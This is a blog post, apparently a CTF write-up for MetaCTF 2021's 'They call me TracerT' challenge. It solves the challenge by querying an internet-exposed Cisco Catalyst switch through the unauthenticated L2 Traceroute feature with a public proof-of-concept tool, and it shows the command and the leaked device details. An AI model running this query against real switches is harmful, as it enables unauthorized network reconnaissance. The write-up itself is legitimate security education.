---
layout: post
title:  "MetaCTF 2021"
date:   2022-03-15 18:00:00 +0100
categories: CTF MetaCTF2021
---

## They call me TracerT

TLDR: You can abuse the Cisco proprietary L2-Traceroute feature.

### Challenge Description

**Points:** 550

**Solves:** 5

**Fastest Solve:** Team Thirst (us)

>One of the things I find fascinating is the sheer amount of information that $random_devices expose to the network, all without authentication. For example, take Windows RPC. Did you know that you can even sometimes determine if an AV is running on a remote host, all based on unauthenticated querying against RPC?
>
>On a related note, we, ummmm, accidentally exposed a Cisco Catalyst switch to the internet in its default configuration (minus disabling ports that are unrelated to solving this problem). It's located at tracert.cg21.mctf.io. The flag is the hostname of the switch. Good luck :)

### Solution

Since we know it's a Cisco Catalyst Switch, we can search through Ciscos Security Advisories. 
Searching for the term "Traceroute"  yields an [informational report](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190925-l2-traceroute) about the proprietary L2 Traceroute feature.
This lets Cisco Switches find other Cisco Switches in the same (OSI) Layer 2 domain (same subnet, usually constrained in a VLAN).

L2 Traceroute builds a local database with all sorts of fun information about other such capable switches in the network. Awesome for maintanance and troubleshooting, but should ***never*** be accessible from outside!

The report mentions the researcher Chris Marget, who has a [Github Repo](https://github.com/chrismarget/cisco-l2t) with a proof of concept.

Before you run his code, you need the IP of the switch:

{% highlight bash %}
soeren@arch:~ $ dig tracert.cg21.mctf.io +short
34.207.70.151
{% endhighlight %}

Afterwards you can run his code like so:

{% highlight bash %}
soeren@arch:~/repos/cisco-l2t $ go run cmd/l2t_ss/main.go -t 1 \
-a 1:ffff.ffff.ffff -a 2:ffff.ffff.ffff \
-a 3:100 -a 14:0.0.0.0 34.207.70.151

Received: L2T_REPLY_DST (3) with 4 attributes (51 bytes)
   4 L2_ATTR_DEV_NAME     thats-tracer-t-to-u
   5 L2_ATTR_DEV_TYPE     WS-C2950T-24
   6 L2_ATTR_DEV_IP       192.168.28.125
  15 L2_ATTR_REPLY_STATUS Status unknown (3)
{% endhighlight %}

And there you have it, the flag is **thats-tracer-t-to-u** for 550 Points.